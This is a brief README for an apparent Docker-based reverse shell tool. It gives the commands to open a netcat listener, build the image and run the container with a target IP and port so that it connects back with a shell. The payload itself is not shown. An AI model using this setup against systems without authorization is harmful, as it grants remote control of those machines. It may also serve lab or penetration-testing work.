# Reverse Shell Container

Run a container which connects back with a reverse shell.

## Start the server

The reverse shell in the container will connect back to your server.
Open up a port with the following snippet:

```bash
nc -lp 6666
```

## Build the image

```bash
docker build -t reverse_shell:latest .
```

## Execute the image

Execute reverse shell container with: `docker run --rm -it -e IP=192.168.178.26 -e PORT=6666 reverse_shell`
